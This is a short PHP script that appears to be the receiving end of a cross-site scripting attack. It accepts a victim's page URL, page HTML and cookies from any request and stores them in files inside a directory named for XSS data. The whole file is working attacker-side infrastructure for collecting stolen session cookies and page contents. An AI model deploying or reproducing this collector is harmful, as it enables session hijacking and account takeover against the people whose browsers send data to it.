<?php
// ini_set("display_error", True);

$url = $_REQUEST["url"];
$html = $_REQUEST["html"];
$cookie = $_REQUEST["cookie"];
$ts = time() . "-" . random_int(0, 100);

$file_name = $ts . '.html';
$cookie_file_name = $ts . '.cookie';

$file_path = "xss_data_198701/" . $file_name;
$f = fopen($file_path, "wb");
fwrite($f, $html);
fclose($f);

$cookie_file_path = "xss_data_198701/" . $cookie_file_name;
$cookie_f = fopen($cookie_file_path, "wb");
fwrite($cookie_f, $url . "\n" . $cookie);
fclose($cookie_f);

?>